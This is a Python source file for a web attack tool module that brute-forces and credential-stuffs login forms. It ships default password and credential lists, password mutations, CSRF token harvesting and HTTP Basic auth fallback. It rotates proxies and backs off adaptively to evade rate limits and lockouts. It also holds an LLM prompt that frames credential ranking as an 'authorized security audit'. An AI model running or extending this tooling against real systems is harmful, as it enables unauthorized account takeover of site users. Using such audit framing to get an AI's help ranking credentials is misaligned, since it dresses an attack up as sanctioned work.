import asyncio
import aiohttp
import base64
import logging
import os
import re
from typing import Dict, List, Optional, Any, Tuple
from urllib.parse import urljoin

SUCCESS_INDICATORS = ['dashboard', 'welcome', 'logout', 'profile', 'admin',
                      'home', 'success', 'authenticated', 'user account']
FAILURE_INDICATORS = ['invalid', 'incorrect', 'error', 'failed', 'wrong',
                      'login', 'unauthorized', 'forbidden', 'denied']


class BruteforceModule:
    def __init__(self, proxy: Optional[str] = None) -> None:
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            },
            connector=aiohttp.TCPConnector(ssl=False)
        )
        self.proxy = proxy
        # Comma-separated proxies are supported and rotated round-robin
        self.proxies = self._parse_proxies(proxy)
        self._proxy_index = 0
        self.logger = logging.getLogger(__name__)

    @staticmethod
    def _parse_proxies(proxy: Optional[str]) -> List[str]:
        """Normalize a proxy (or comma-separated proxy list) to a list."""
        if not proxy:
            return []
        if isinstance(proxy, str):
            return [p.strip() for p in proxy.split(',') if p.strip()]
        return [p for p in proxy if p]

    def _next_proxy(self) -> Optional[str]:
        """Round-robin proxy selection; None when no proxies configured."""
        if not self.proxies:
            return None
        proxy = self.proxies[self._proxy_index % len(self.proxies)]
        self._proxy_index += 1
        return proxy

    async def _request(self, method: str, url: str, **kwargs) -> Optional[aiohttp.ClientResponse]:
        """Request helper that routes through the configured proxy(es)."""
        kwargs.setdefault('ssl', False)
        kwargs.setdefault('allow_redirects', True)
        kwargs.setdefault('timeout', aiohttp.ClientTimeout(total=8))
        proxy = self._next_proxy()
        if proxy:
            kwargs['proxy'] = proxy
        if method.upper() == 'POST':
            return await self.session.post(url, **kwargs)
        return await self.session.get(url, **kwargs)

    async def bruteforce_login_forms(
        self,
        login_forms: List[Dict[str, Any]],
        custom_username_file: Optional[str] = None,
        custom_password_file: Optional[str] = None,
    ) -> List[Dict[str, Any]]:
        """Bruteforce discovered login forms with custom wordlists support"""
        successful_logins = []

        # Load base wordlists
        usernames = self._load_wordlist(custom_username_file, [
            'admin', 'administrator', 'root', 'user', 'test', 'guest',
            'manager', 'support', 'demo', 'webmaster', 'operator', 'service',
            'sa', 'postgres', 'oracle', 'mysql', 'ftp', 'mail'
        ])

        passwords = self._load_wordlist(custom_password_file, [
            'admin', 'password', '123456', '123456789', 'qwerty', 'abc123',
            'password123', 'admin123', 'root', 'letmein', 'welcome', 'monkey',
            'dragon', 'passw0rd', 'p@ssw0rd', '12345', '12345678', '1234567890',
            'Password1', 'Pass123', 'admin@123', 'root@123', 'pass', '1q2w3e4r',
            'qwerty123', 'superman', 'batman', 'starwars', 'iloveyou'
        ])

        for form in login_forms:
            form_url = form['url']
            method = form['method']
            inputs = form['inputs']

            print(f"  [*] Bruteforcing login form: {form_url}")
            self.logger.info(f"Bruteforcing login form: {form_url}")

            username_field, password_field, other_fields = self._identify_fields(inputs)

            if not username_field or not password_field:
                print(f"    [-] Could not identify username/password fields for {form_url}")
                continue

            # Try combinations
            attempt_count = 0
            for username in usernames:
                for password in passwords:
                    attempt_count += 1
                    data = {username_field: username, password_field: password}
                    data.update(other_fields)

                    try:
                        if method == 'POST':
                            async with self._request('POST', form_url, data=data) as response:
                                content = await response.text()
                        else:
                            # For GET, though rare
                            async with self._request('GET', form_url, params=data) as response:
                                content = await response.text()

                        # Check for success indicators
                        content_lower = content.lower()
                        has_success = any(ind in content_lower for ind in SUCCESS_INDICATORS)
                        has_failure = any(ind in content_lower for ind in FAILURE_INDICATORS)
                        
                        # Enhanced heuristic: response status 200, decent size, no failure indicators
                        if (has_success or (len(content) > 500 and not has_failure)) and response.status == 200:
                            successful_logins.append({
                                'url': form_url,
                                'username': username,
                                'password': password,
                                'method': method
                            })
                            print(f"    [+] SUCCESS: {username}:{password} on {form_url}")
                            self.logger.warning(f"Successful login found: {username}:{password} on {form_url}")
                            break  # Found one, move to next form
                    except Exception as e:
                        self.logger.debug(f"Error bruteforcing {form_url}: {e}")
                        continue
                    
                    # Progress logging every 50 attempts
                    if attempt_count % 50 == 0:
                        self.logger.info(f"Bruteforce progress: {attempt_count} attempts on {form_url}")
                
                if successful_logins and successful_logins[-1]['url'] == form_url:
                    print(f"    [+] Form {form_url} compromised, moving to next form")
                    break  # Already found for this form

        return successful_logins

    def _load_wordlist(self, file_path: Optional[str], default_list: List[str]) -> List[str]:
        """Load wordlist from file or return default"""
        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    words = [line.strip() for line in f if line.strip()]
                    return words[:1000]  # Limit to prevent excessive attempts
            except Exception as e:
                self.logger.warning(f"Failed to load wordlist {file_path}: {e}")
        return default_list

    async def intelligent_bruteforce(self, login_forms: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """ML-based password prediction and intelligent bruteforce"""
        successful_logins = []

        # Intelligent password generation based on common patterns
        intelligent_passwords = self._generate_intelligent_passwords()

        for form in login_forms:
            form_url = form['url']
            method = form['method']
            inputs = form['inputs']

            print(f"  [*] Intelligent bruteforce on: {form_url}")

            # Identify fields
            username_field, password_field, other_fields = self._identify_fields(inputs)

            if not username_field or not password_field:
                continue

            # Try intelligent combinations first
            for username in ['admin', 'root', 'administrator']:
                for password in intelligent_passwords[:50]:  # Limit attempts
                    if await self._try_login(form_url, method, username_field, password_field, username, password, other_fields):
                        successful_logins.append({
                            'url': form_url,
                            'username': username,
                            'password': password,
                            'method': 'intelligent'
                        })
                        break
                if successful_logins and successful_logins[-1]['url'] == form_url:
                    break

        return successful_logins

    def _generate_intelligent_passwords(self) -> List[str]:
        """Generate passwords based on common patterns and mutations"""
        bases = ['admin', 'password', '123456', 'qwerty', 'letmein']
        mutations = [
            lambda x: x,
            lambda x: x + '123',
            lambda x: x + '!',
            lambda x: x + '2024',
            lambda x: x.capitalize(),
            lambda x: x.upper(),
            lambda x: 'P@ssw0rd' if x == 'password' else x,
        ]

        passwords = set()
        for base in bases:
            for mutation in mutations:
                passwords.add(mutation(base))

        # Add common passwords
        common = ['admin123', 'Admin123', 'Password1', 'Welcome1', 'Monkey123']
        passwords.update(common)

        return list(passwords)

    def _identify_fields(self, inputs: List[Dict[str, str]]) -> Tuple[Optional[str], Optional[str], Dict[str, str]]:
        """Identify username (incl. email-style), password and other fields."""
        username_field: Optional[str] = None
        password_field: Optional[str] = None
        other_fields: Dict[str, str] = {}

        username_hints = ('user', 'email', 'mail', 'login', 'uid', 'username',
                          'userid', 'loginid', 'log', 'account', 'user_name')
        for inp in inputs:
            if not isinstance(inp, dict):
                continue
            name = inp.get('name') or ''
            if not name:
                continue
            field_type = (inp.get('type') or '').lower()
            lower = name.lower()
            if username_field is None and (
                    field_type == 'email' or any(h in lower for h in username_hints)):
                username_field = name
            elif password_field is None and (
                    'pass' in lower or 'pwd' in lower):
                password_field = name
            else:
                other_fields[name] = 'default'

        return username_field, password_field, other_fields

    async def _try_login(self, url: str, method: str, username_field: str, password_field: str, username: str, password: str, other_fields: Dict[str, str]) -> bool:
        """Try a single login attempt"""
        data = {username_field: username, password_field: password}
        data.update(other_fields)

        try:
            if method == 'POST':
                async with self._request('POST', url, data=data) as response:
                    content = await response.text()
            else:
                async with self._request('GET', url, params=data) as response:
                    content = await response.text()

            # Check for success
            success_indicators = ['dashboard', 'welcome', 'logout', 'profile', 'admin', 'home', 'success', 'authenticated']
            failure_indicators = ['invalid', 'incorrect', 'error', 'failed', 'wrong', 'login', 'unauthorized', 'forbidden', 'denied']

            content_lower = content.lower()
            has_success = any(ind in content_lower for ind in success_indicators)
            has_failure = any(ind in content_lower for ind in failure_indicators)

            return (has_success or (len(content) > 500 and not has_failure)) and response.status == 200

        except Exception as e:
            self.logger.debug('Error in _try_login for %s: %s', url, e)
            return False

    async def credential_stuffing(
        self,
        login_forms: List[Dict[str, Any]],
        creds_file: Optional[str] = None,
        cookie_file: Optional[str] = None,
        use_ai: bool = False,
        attempt_delay: float = 0.0,
        max_attempts_per_form: int = 0,
    ) -> List[Dict[str, Any]]:
        """Credential stuffing of discovered login forms.

        Replays previously-known credentials (from ``creds_file`` in
        ``user:pass`` format, or a built-in default list) against every login
        form.  Uses the shared session cookie jar - cookies set by the target
        during an attempt (CSRF tokens, session cookies) are automatically
        replayed on subsequent attempts, and a Netscape-style cookie file can
        be seeded via ``cookie_file``.

        Upgrades:
        - ``attempt_delay``: fixed delay (seconds) between attempts per form
          to avoid lockouts / rate limits
        - adaptive backoff: 429 responses double the delay, 403s add a small
          backoff, success resets it
        - ``use_ai``: optional AI re-ranking of the credential pool (safe
          fallback to the original order when the AI is unavailable)
        - CSRF tokens: hidden csrf/token/authenticity inputs are harvested
          from the form page and replayed on every attempt
        - Forms without identifiable fields fall back to HTTP Basic auth
        - ``max_attempts_per_form``: hard cap on attempts per form (0 = none)
        """
        successful_logins = []
        credentials = self._load_credentials(creds_file)
        if not credentials:
            print(f"    [-] No credentials to stuff")
            return successful_logins

        if cookie_file:
            loaded = self._load_cookies(cookie_file)
            print(f"  [*] Seeded {loaded} cookies from {cookie_file}")

        if use_ai:
            credentials = await self._ai_prioritize_credentials(credentials)
            if credentials:
                print(f"  [*] AI re-ranked credential pool ({len(credentials)} pairs)")

        print(f"  [*] Credential stuffing {len(login_forms)} login forms "
              f"with {len(credentials)} credential pairs")
        self.logger.info(f"Credential stuffing started for {len(login_forms)} forms")

        attempt_count = 0
        for form in login_forms:
            form_url = form['url']
            method = form['method']
            inputs = form['inputs']

            print(f"  [*] Stuffing login form: {form_url}")
            username_field, password_field, other_fields = self._identify_fields(inputs)

            # HTTP Basic auth fallback when no form fields can be identified
            if not username_field or not password_field:
                print(f"    [-] No username/password fields - trying HTTP Basic auth stuffing")
                for username, password in credentials:
                    if max_attempts_per_form and attempt_count >= max_attempts_per_form:
                        break
                    attempt_count += 1
                    if await self._try_basic_auth(form_url, username, password):
                        successful_logins.append({
                            'url': form_url,
                            'username': username,
                            'password': password,
                            'method': 'basic-auth',
                            'source': 'credential-stuffing'
                        })
                        print(f"    [+] SUCCESS (basic-auth stuffing): {username}:{password} on {form_url}")
                        self.logger.warning(f"Basic-auth stuffing success: {username}:{password} on {form_url}")
                        break
                    if attempt_delay:
                        await asyncio.sleep(attempt_delay)
                continue

            # CSRF token auto-harvest for POST forms with token fields
            csrf_field, csrf_value = await self._harvest_csrf(form_url, method)
            csrf_like = [k for k in other_fields
                         if any(t in k.lower() for t in ('csrf', 'token', 'authenticity'))]
            if csrf_like and not csrf_field:
                csrf_field, csrf_value = csrf_like[0], 'default'
            if csrf_field and csrf_like and csrf_like[0] != csrf_field:
                other_fields.pop(csrf_like[0], None)
            if csrf_field:
                print(f"    [*] CSRF token field '{csrf_field}' will be replayed per attempt")

            backoff = 0.0
            form_attempts = 0
            for username, password in credentials:
                if max_attempts_per_form and form_attempts >= max_attempts_per_form:
                    break
                form_attempts += 1
                attempt_count += 1
                data = {username_field: username, password_field: password}
                data.update(other_fields)
                if csrf_field and method.upper() == 'POST':
                    data[csrf_field] = csrf_value

                try:
                    if backoff or attempt_delay:
                        await asyncio.sleep(attempt_delay + backoff)
                    async with (await self._request(
                            method, form_url,
                            data=data if method.upper() == 'POST' else None,
                            params=None if method.upper() == 'POST' else data)) as response:
                        content = await response.text()

                    # Adaptive backoff: 429 = rate limited, 403 = blocked
                    if response.status == 429:
                        backoff = min(backoff + 1.0, 10.0)
                        self.logger.info(f"Rate limited on {form_url} - backing off {backoff:.1f}s")
                        continue
                    if response.status == 403:
                        backoff = min(backoff + 0.5, 5.0)
                        content_lower = content.lower()
                        has_success = any(ind in content_lower for ind in SUCCESS_INDICATORS)
                        has_failure = any(ind in content_lower for ind in FAILURE_INDICATORS)
                        if has_success and not has_failure:
                            successful_logins.append({
                                'url': form_url,
                                'username': username,
                                'password': password,
                                'method': method,
                                'source': 'credential-stuffing'
                            })
                            print(f"    [+] SUCCESS (stuffing): {username}:{password} on {form_url}")
                            self.logger.warning(f"Credential stuffing success: {username}:{password} on {form_url}")
                            break
                        continue

                    content_lower = content.lower()
                    has_success = any(ind in content_lower for ind in SUCCESS_INDICATORS)
                    has_failure = any(ind in content_lower for ind in FAILURE_INDICATORS)
                    if (has_success or (len(content) > 500 and not has_failure)) and response.status == 200:
                        successful_logins.append({
                            'url': form_url,
                            'username': username,
                            'password': password,
                            'method': method,
                            'source': 'credential-stuffing'
                        })
                        print(f"    [+] SUCCESS (stuffing): {username}:{password} on {form_url}")
                        self.logger.warning(f"Credential stuffing success: {username}:{password} on {form_url}")
                        break
                    backoff = max(backoff - 0.25, 0.0)
                except Exception as e:
                    self.logger.debug(f"Error stuffing {form_url}: {e}")
                    continue

                if attempt_count % 50 == 0:
                    self.logger.info(f"Credential stuffing progress: {attempt_count} attempts")

        print(f"  [*] Credential stuffing complete: {len(successful_logins)} successes "
              f"in {attempt_count} attempts")
        return successful_logins

    async def _harvest_csrf(self, url: str, method: str) -> Tuple[Optional[str], Optional[str]]:
        """Fetch the form page and extract a CSRF/token hidden field (if any)."""
        if method.upper() != 'POST':
            return None, None
        try:
            async with (await self._request('GET', url)) as response:
                content = await response.text()
        except Exception as e:
            self.logger.debug(f"CSRF harvest failed for {url}: {e}")
            return None, None
        try:
            for match in re.finditer(r'<input[^>]*>', content, re.I):
                tag = match.group(0)
                name = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
                value = re.search(r'value\s*=\s*["\']([^"\']*)["\']', tag, re.I)
                if name and value and any(
                        t in name.group(1).lower()
                        for t in ('csrf', 'token', 'authenticity')):
                    return name.group(1), value.group(1)
        except Exception as e:
            self.logger.debug(f"CSRF harvest parse failed for {url}: {e}")
        return None, None

    async def _try_basic_auth(self, url: str, username: str, password: str) -> bool:
        """Try a single HTTP Basic auth login."""
        token = base64.b64encode(f"{username}:{password}".encode('utf-8')).decode('ascii')
        headers = {'Authorization': f'Basic {token}'}
        try:
            async with (await self._request('GET', url, headers=headers)) as response:
                content = await response.text()
        except Exception as e:
            self.logger.debug(f"Basic auth attempt failed for {url}: {e}")
            return False
        if response.status in (401, 403):
            return False
        content_lower = content.lower()
        has_success = any(ind in content_lower for ind in SUCCESS_INDICATORS)
        has_failure = any(ind in content_lower for ind in FAILURE_INDICATORS)
        return response.status == 200 and (has_success or (len(content) > 500 and not has_failure))

    async def _ai_prioritize_credentials(self, credentials: List[tuple]) -> List[tuple]:
        """Optionally re-rank the credential pool with the AI engine.

        Never raises: falls back to the original ordering on any failure.
        """
        try:
            from modules.ai_integration import AIIntegration
            engine = AIIntegration()
            if not engine.enabled:
                return credentials
            pool = credentials[:100]
            prompt = (
                "You are ranking credential pairs for an authorized security "
                "audit. Reorder the following username:password pairs from most "
                "to least likely to be default/weak credentials used on web "
                "applications. Respond ONLY with the pairs, one per line, in "
                "username:password format, nothing else.\n"
                + "\n".join(f"{u}:{p}" for u, p in pool)
            )
            response = await engine._call_llm(prompt)
            if not response:
                return credentials
            ranked = []
            seen = set()
            for line in (response or '').splitlines():
                parts = line.strip().replace(',', ':').split(':')
                if len(parts) >= 2:
                    pair = (parts[0].strip(), parts[1].strip())
                    if pair in pool and pair not in seen:
                        seen.add(pair)
                        ranked.append(pair)
            if ranked:
                return ranked + [p for p in pool if p not in seen] + \
                       [p for p in credentials if p not in pool]
        except Exception as e:
            self.logger.debug(f"AI credential ranking failed: {e}")
        return credentials

    def _load_credentials(self, creds_file: Optional[str]) -> List[tuple]:
        """Load ``user:pass`` credential pairs from a file or return defaults."""
        if creds_file and os.path.exists(creds_file):
            try:
                pairs = []
                with open(creds_file, 'r', encoding='utf-8', errors='ignore') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        parts = line.replace(',', ':').split(':')
                        if len(parts) >= 2:
                            pairs.append((parts[0].strip(), parts[1].strip()))
                if pairs:
                    return pairs[:2000]
                self.logger.warning(f"No valid credential pairs in {creds_file}")
            except Exception as e:
                self.logger.warning(f"Failed to load credentials {creds_file}: {e}")
        return [
            ('admin', 'admin'), ('admin', 'password'), ('admin', '123456'),
            ('admin', 'admin123'), ('admin', 'password123'), ('admin', 'Password1'),
            ('admin', 'Admin@123'), ('admin', 'letmein'), ('admin', 'welcome'),
            ('admin', 'qwerty'), ('admin', 'root'), ('admin', 'toor'),
            ('root', 'root'), ('root', 'toor'), ('root', 'password'),
            ('root', '123456'), ('root', 'admin'), ('root', 'letmein'),
            ('administrator', 'administrator'), ('administrator', 'admin'),
            ('administrator', 'password'), ('administrator', '123456'),
            ('administrator', 'Admin@123'), ('user', 'user'), ('user', 'password'),
            ('user', '123456'), ('user', 'user123'), ('guest', 'guest'),
            ('test', 'test'), ('test', 'test123'), ('test', 'password'),
            ('support', 'support'), ('support', 'password'),
            ('admin', 'changeme'), ('admin', 'password1'), ('admin', 'Passw0rd'),
            ('demo', 'demo'), ('demo', 'demo123'), ('manager', 'manager'),
            ('admin', '1q2w3e4r'), ('admin', 'qwerty123'), ('admin', 'abc123'),
        ]

    def _load_cookies(self, cookie_file: str) -> int:
        """Load Netscape-format or ``name=value`` cookies into the session jar."""
        count = 0
        try:
            with open(cookie_file, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    parts = line.split('\t')
                    if len(parts) >= 7:  # Netscape format
                        domain, _include_sub, path, _secure, _expires, name, value = parts[:7]
                        try:
                            from yarl import URL
                            self.session.cookie_jar.update_cookies(
                                {name: value},
                                response_url=URL(f'http://{domain}{path}'))
                        except ImportError:
                            self.session.cookie_jar.update_cookies({name: value})
                        count += 1
                    elif '=' in line:  # simple name=value
                        name, value = line.split('=', 1)
                        self.session.cookie_jar.update_cookies({name.strip(): value.strip()})
                        count += 1
        except Exception as e:
            self.logger.warning(f"Failed to load cookie file {cookie_file}: {e}")
        return count

    async def close(self) -> None:
        await self.session.close()